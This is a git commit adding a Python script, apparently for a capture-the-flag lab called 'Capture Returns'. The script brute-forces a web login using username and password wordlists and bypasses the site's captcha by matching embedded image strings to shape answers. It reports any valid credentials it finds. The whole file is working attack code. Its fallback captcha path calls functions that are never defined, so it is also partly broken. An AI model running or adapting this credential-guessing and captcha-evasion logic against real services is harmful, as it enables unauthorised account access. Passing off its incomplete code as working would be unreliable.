d4d6386cae8218dbb0bcd0a3525b5811eda0c738
r3dBust3r <90137144+r3dBust3r@users.noreply.github.com>
2025-03-08 09:09:11 +0000

    Capture Returns

---
+++ capture-returns.py
@@ -0,0 +1,52 @@
+import requests
+
+def get_userpass(userlist, passlist):
+    with open(userlist, 'rt') as file1, open(passlist, 'rt') as file2:
+        return file1.read().splitlines(), file2.read().splitlines()
+
+def http_req(method, end_point, data=None):
+    return requests.request(method=method, url=end_point, data=data)
+
+def main():
+    TARGET = '10.10.41.6'
+    LOGIN_END_POINT = f'http://{TARGET}/login'
+
+    USER_LIST = 'list.txt'
+    PASS_LIST = 'pass.txt'
+    
+    usernames, passwords = get_userpass(USER_LIST, PASS_LIST)
+
+    for u in usernames:
+        for p in passwords:
+            u = u.strip()
+            p = p.strip()
+
+            while True:
+                r = http_req('GET', LOGIN_END_POINT)
+                if 'Detected 3 incorrect login attempts!' in r.text:
+                    data = {"captcha": ""}
+                    if 'Dh4eHvKNzWywWf8f0eDzOu4f5LxrOwHAGhjMwnIHhDAxnYDgDwxkYzsBwBoYzMJyB4QwMZ2A4A8MZGM7AcAa' in r.text:
+                        data['captcha'] = "square"
+                    elif 'ksIZpR4atmypa6PoeoGGCBfvXpFKzxwQChwnQUwzjMqKspevSckRLfz1g0wgE6bNo1sOHBAOKPQBqjeU6lSJ' in r.text:
+                        data['captcha'] = 'triangle'
+                    elif 'uabb7y15AEDBkjbkIjUV4GNNa9bt063atVKMv2tt94q6RJrVx01gRGWSKxevVrKG9zymDFj9IULFzyfsAAti' in r.text:
+                        data['captcha'] = 'circle'
+                    else:
+                        image = extract_captcha_image(r.text)
+                        result = solve_captcha(image)
+                        data['captcha'] = result
+
+                    http_req('POST', LOGIN_END_POINT, data=data)
+                else:
+                    break
+
+            data = {"username": u, "password": p}
+            r = http_req('POST', LOGIN_END_POINT, data=data)
+            if 'Invalid username or password' in r.text:
+                continue
+            print(f"\n[*] Valid creds found: {u}:{p}")
+            if input('[E]xit | [C]ontinue\n> ').strip().lower() in ['e', 'exit']:
+                exit(0)
+
+if __name__ == '__main__':
+    main()
